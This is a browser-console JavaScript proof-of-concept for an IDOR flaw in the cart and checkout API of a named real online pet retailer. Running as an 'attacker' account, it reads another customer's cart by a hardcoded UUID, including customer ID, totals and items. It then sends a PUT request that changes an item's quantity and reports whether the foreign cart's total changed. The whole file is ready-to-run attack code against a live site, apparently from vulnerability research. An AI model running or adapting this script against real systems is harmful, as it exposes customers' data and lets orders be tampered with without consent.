// Complete IDOR Test: Read + Write
// Execute in browser console while logged in as Account B (attacker)

const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";

(async function () {
  console.log("[*] ========================================");
  console.log("[*] COMPLETE IDOR TEST (Read + Write)");
  console.log("[*] ========================================");

  // ========== PART 1: READ IDOR ==========
  console.log("\n[1] Testing IDOR Read...");
  const cartRead = await fetch(
    `https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`,
    {
      credentials: "include",
    }
  ).then((r) => r.json());

  console.log(
    `[+] Read SUCCESS: Cart total = ${cartRead.summary.grandTotal} EUR`
  );
  console.log(`[+] Customer ID: ${cartRead.customerId || "N/A"}`);
  console.log(`[+] Items: ${cartRead.articles.length}`);

  // ========== PART 2: WRITE IDOR ==========
  console.log("\n[2] Testing IDOR Write...");

  const beforeTotal = cartRead.summary.grandTotal;
  const articleId =
    cartRead.articles.find((a) => a.id === 2966422)?.id ||
    cartRead.articles[0]?.id;

  console.log(`[+] Before: ${beforeTotal} EUR`);
  console.log(`[+] Modifying article ${articleId}...`);

  const writeResponse = await fetch(
    `https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/set-article-quantity`,
    {
      method: "PUT",
      credentials: "include",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
      },
      body: JSON.stringify({
        articleId: articleId,
        quantity: 2,
      }),
    }
  );

  console.log(`[+] Write Response: HTTP ${writeResponse.status}`);

  await new Promise((r) => setTimeout(r, 3000));

  const cartAfter = await fetch(
    `https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`,
    {
      credentials: "include",
    }
  ).then((r) => r.json());

  const afterTotal = cartAfter.summary.grandTotal;
  console.log(`[+] After: ${afterTotal} EUR`);

  // ========== RESULTS ==========
  console.log("\n[*] ========================================");
  console.log("[*] RESULTS");
  console.log("[*] ========================================");
  console.log(`[+] Read IDOR:  CONFIRMED (accessed Account A's cart)`);

  if (Math.abs(afterTotal - beforeTotal) > 0.01) {
    console.log(
      `[+] Write IDOR:  CONFIRMED (${beforeTotal} → ${afterTotal} EUR)`
    );
    console.log("\n[!!!] CRITICAL IDOR VULNERABILITY CONFIRMED!");
    console.log("[!!!] Both read and write access to foreign carts!");
  } else {
    console.log(`[+] Write IDOR:   Inconclusive (cart unchanged)`);
  }
})();



